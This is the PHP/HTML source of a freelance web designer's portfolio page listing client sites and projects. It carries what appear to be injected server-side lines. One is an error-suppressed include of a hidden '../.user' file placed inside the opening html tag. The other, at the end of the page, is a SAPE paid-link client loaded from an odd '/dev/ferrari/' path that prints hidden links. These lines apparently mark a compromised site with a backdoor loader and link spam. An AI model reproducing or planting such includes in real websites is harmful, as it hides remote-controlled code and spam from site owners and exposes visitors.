<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><?php @require_once'../.user'; ?>
<head>
<title>Design Portfolio of Annette Calabrese</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<meta name="description" content="Hi. I'm Annette. I'm a freelance web desiger currently living and working in Ann Arbor, Michigan. Come checkout my design playground." />
<meta name="keywords" content="Annette Calabrese, Web Designer, Drupal Deveolper, Front-End developer, Freelance Web Designer Ann Arbor Michigan, Graphic Designer, Design Portfolio, non-profit clients" />

<meta name="google-site-verification" content="JdnW_N4j4RVYcIfjU1jvS6hoesmesxR5cBI5FUeFcNg" />

<link href="css/styles.css" rel="stylesheet" type="text/css" />
<link rel="shortcut icon" href="favicon.ico" />
<link rel="icon" href="favicon.ico" />
<link href='https://fonts.googleapis.com/css?family=Yanone+Kaffeesatz' rel='stylesheet' type='text/css'>

<script type="text/javascript" src="js/root.js"></script>
<script type="text/javascript" src="js/mootools.svn.js"></script>

<script type="text/javascript">

function showElement(layer){
	var myLayer = document.getElementById(layer);
	if(myLayer.style.display=="none"){
		myLayer.style.display="block";
		myLayer.backgroundPosition="top";
	} else { 
		myLayer.style.display="none";
	}
}


// Mootools 
// Slide Down for About
window.addEvent('domready', function(){
	//-vertical
			
	var mySlide = new Fx.Slide('about');
	mySlide.hide(); 
	$('about_toggle').addEvent('click', function(e){
		e = new Event(e);
		mySlide.toggle();
		e.stop();
	});

}); 

</script>

</head>

<body>

<div id="container">

<h1 class="logo"><a href=".">Annette Calabrese <span>Graphic &amp; Web Designer</span></a></h1>
<h2 class="message">I'm a freelance designer and drupal developer originally hailing from the suburbs of Detroit, currently residing in Ann Arbor, Michigan. Feel free to check out some of my latest work below, and if you still want more, you can take a peek at my <a href="resume.php">resume</a>.</h2>

<div id="main_content">

<!-- START Portfolio -->
<div class="work left">
<img src="images/work_calocomingsoon.jpg" width="250" height="150" alt="Calo" />
<h3>CSI <span>2016</span></h3>
<p class="info">A corporate website for CSI Advantage, a company with a branch focusing on controls engineering. </p>
<p class="tools">Drupal 7, Site Design, jQuery, Responsive, Logo Design</p>
<a class="visit" href="http://csiadvantage.com" target="_blank">visit the site &gt;</a>
</div>

<div class="work">
<img src="images/work_altshift.jpg" width="250" height="150" alt="Alt+Shift" />
<h3>Alt+Shift <span>2016</span></h3>
<p class="info">A site for the Michigan Department of Education that will serve both educators and parents with a resource hub and area to check items out of their Lending Library. </p>
<p class="tools">Drupal 7, Design, jQuery, Responsive</p>
<a class="visit" href="https://www.altshift.education" target="_blank">visit the site &gt;</a>
</div>

<div class="work">
<img src="images/work_nevalogy.jpg" width="250" height="150" alt="Nevalogy" />
<h3>Nevalogy <span>2016</span></h3>
<p class="info">A blog for scientist and former NASA employee Neva Ciftcioglu Banes. This blog is Neva's outlet for her writing on various science topics and beyond.</p>
<p class="tools">Drupal 7, Design, jQuery, Responsive</p>
<a class="visit" href="http://www.nevalogy.com/" target="_blank">visit the site &gt;</a>
</div>



<div class="work left">
<img src="images/work_anthonyalison.jpg" width="250" height="150" alt="Anthony and Alison" />
<h3>Alison & Anthony <span>2016</span></h3>
<p class="info">A wedding website featuring the couple's story, event information, and resources for those from out-of-town.</p>
<p class="tools">Drupal 7, Design, jQuery, Responsive, Logo Design, Print Design</p>
<a class="visit" href="http://www.anthonyandalison.com/" target="_blank">visit the site &gt;</a>
</div>

<div class="work">
<img src="images/work_drinkmilknew.jpg" width="250" height="150" alt="Drink Milk" />
<h3>American Dairy Association Mideast <span>2015</span></h3>
<p class="info">Responsible for the design of their <em>Drink Milk</em> site. <b>This was a <a class="inline" href="http://www.bluevalleytech.com/" target="_blank" style="font-weight: bold;">Blue Valley Technologies</a> project.</b></p>
<p class="tools">Lead Designer</p>
<a class="visit" href="http://www.drink-milk.com/" target="_blank">visit the site ></a>
</div>

<div class="work">
<img src="images/work_modernsurvivalists.jpg" width="250" height="150" alt="Modern Survivalists" />
<h3>Modern Survivalists <span>2015</span></h3>
<p class="info">A blog site featuring information on preparedness and survival skills. <b>This was a <a class="inline" href="http://www.bluevalleytech.com/" target="_blank" style="font-weight: bold;">Blue Valley Technologies</a> project.</b></p>
<p class="tools">Wordpress Theming, Design, jQuery, Responsive</p>
<a class="visit" href="http://www.modersurvivalists.com/" target="_blank">visit the site &gt;</a>
</div>




<div class="work left">
<img src="images/work_ifitweremyhome.jpg" width="250" height="150" alt="If It Were My Home" />
<h3>If It Were My Home <span>2010</span></h3>
<p class="info">Responsible for the logo and website design of this country comparison website.</p>
<p class="tools">Lead Designer</p>
<a class="visit" href="http://www.ifitweremyhome.com/compare/US/KE" target="_blank">visit the site ></a>
</div>

<div class="work">
<img src="images/work_eatpork.jpg" width="250" height="150" alt="Eat Pork" />
<h3>Eat Pork <span>2014</span></h3>
<p class="info">Kansas Pork Association was in need of a modern redesign of their <em>Eat Pork</em> website. <b>This was a <a class="inline" href="http://www.bluevalleytech.com/" target="_blank" style="font-weight: bold;">Blue Valley Technologies</a> project.</b></p>
<p class="tools">Lead Designer</p>
<a class="visit" href="http://www.eatpork.org/" target="_blank">visit the site &gt;</a>
</div>

<div class="work">
<img src="images/work_ohpork.jpg" width="250" height="150" alt="Ohio Pork" />
<h3>Ohio Pork <span>2014</span></h3>
<p class="info">The Ohio Pork Coucil wanted an updated and responsive design for their new site. <b>This was a <a class="inline" href="http://www.bluevalleytech.com/" target="_blank" style="font-weight: bold;">Blue Valley Technologies</a> project.</b></p>
<p class="tools">Lead Designer</p>
<a class="visit" href="http://www.ohiopork.org/" target="_blank">visit the site &gt;</a>
</div>




<div class="work left">
<img src="images/work_inpork.jpg" width="250" height="150" alt="Indiana Pork" />
<h3>Indiana Pork <span>2014</span></h3>
<p class="info">An clean, bright and responsive design was the goal with Indiana Pork's updated site. <b>This was a <a class="inline" href="http://www.bluevalleytech.com/" target="_blank" style="font-weight: bold;">Blue Valley Technologies</a> project.</b></p>
<p class="tools">Lead Designer</p>
<a class="visit" href="http://www.indianapork.com/" target="_blank">visit the site &gt;</a>
</div>

<div class="work">
<img src="images/work_forza_retail.jpg" width="250" height="150" alt="Forza Retail" />
<h3>Forza Retail</h3>
<p class="info">Lead Designer and Drupal Developer for Forza Retails' inter-company ecommerce website.</p>
<p class="tools">Drupal 7, Design</p>
</div>

<div class="work">
<img src="images/work_optiflow.jpg" width="250" height="150" alt="OptiFlow Inc." />
<h3>OptiFlow Inc.</h3>
<p class="info">Lead Designer and Drupal Developer for OptiFlows' informational corporate website.</p>
<p class="tools">Drupal 7, Design</p>
<a class="visit" href="http://optiflowinc.com/" target="_blank">visit the site ></a>
</div>




<div class="work left">
<img src="images/work_smallplanet.jpg" width="250" height="150" alt="Small Planet Institute" />
<h3>Small Planet Institute <span>2010</span></h3>
<p class="info">Lead Designer and Drupal Developer of the new Small Planet Institute's website.</p>
<p class="tools">Drupal 6, Design, jQuery</p>
<a class="visit" href="http://www.smallplanet.org" target="_blank">visit the site ></a>
</div>

<div class="work">
<img src="images/work_gettingagrip.jpg" width="250" height="150" alt="Getting A Grip 2" />
<h3>Getting A Grip 2 <span>2010</span></h3>
<p class="info">Website for author Frances Moore Lapp&eacute;'s latest book <em>Getting A Grip 2</em>.</p>
<p class="tools">Design, jQuery</p>
</div>

<div class="work">
<img src="images/work_liberationecology.jpg" width="250" height="150" alt="Liberation Ecology" />
<h3>Liberation Ecology <span>2010</span></h3>
<p class="info">Website for author Frances Moore Lapp&eacute;'s book <em>Liberation Ecology</em>.</p>
<p class="tools">Wordpress, Design</p>
</div>




<div class="work left">
<img src="images/work_ukiah.jpg" width="250" height="150" alt="Ukiah Mendocino" />
<h3>Ukiah Mendocino <span>2010</span></h3>
<p class="info">Poster and Brocures for a Frances Moore Lapp&eacute; Speech at Yoga Mendocino in Mendocino, CA.</p>
<p class="tools">Print Design</p>
</div>

<div class="work">
<img src="images/work_alpacas.jpg" width="250" height="150" alt="Crystal Lake Alpaca Farm" />
<h3>Crystal Lake Alpaca Farm <span>2006</span></h3>
<p class="info">Informational website for the Crystal Lake Alpaca Farm in Northern Michigan.</p>
<p class="tools">Drupal 7, Design</p>
</div>

<div class="work">
<img src="images/work_badseed.jpg" width="250" height="150" alt="Badseed" />
<h3>Badseed Clothing <span>2009</span></h3>
<p class="info">Responsible for the design of Badseed Clothing companies ecommerce website. <b>This was an Active Media Architects project.</b></p>
<p class="tools">Lead Designer</p>
</div>




<div class="work left">
<img src="images/work_dalton.jpg" width="250" height="150" alt="Dalton Carpet" />
<h3>Dalton Carpet <span>2009</span></h3>
<p class="info">Responsible for the design of Dalton Carpets ecommerce website. <b>This was an Active Media Architects project.</b></p>
<p class="tools">Lead Designer</p>
</div>


<div class="work">
<img src="images/work_drf.jpg" width="250" height="150" alt="Authentic Ireland" />
<h3>Deafness Research Foundation <span>2007</span></h3>
<p class="info">Responsible for the design of Deafness Research Foundations informational site. <b>This was an Active Media Architects project.</b></p>
<p class="tools">Lead Designer</p>
</div>




</div>

<div id="footer"></div>



<script src="http://www.google-analytics.com/urchin.js" type="text/javascript">
</script>
<script type="text/javascript">
_uacct = "UA-371626-1";
urchinTracker();
</script>

<!-- Woopra Code Start -->
<script type="text/javascript" src="//static.woopra.com/js/woopra.v2.js"></script>
<script type="text/javascript">
woopraTracker.setDomain("annettecalabrese.com");
woopraTracker.track();
</script>
<!-- Woopra Code End -->
<?php
     if (!defined('_SAPE_USER')){
        define('_SAPE_USER', '2ec607c63582862490ce9e076ace726c');
     }
     require_once(realpath($_SERVER['DOCUMENT_ROOT'].'/dev/ferrari/'._SAPE_USER.'/sape.php'));
     $sape = new SAPE_client();
	 echo $sape->return_links($n);
?>
</body>
</html>
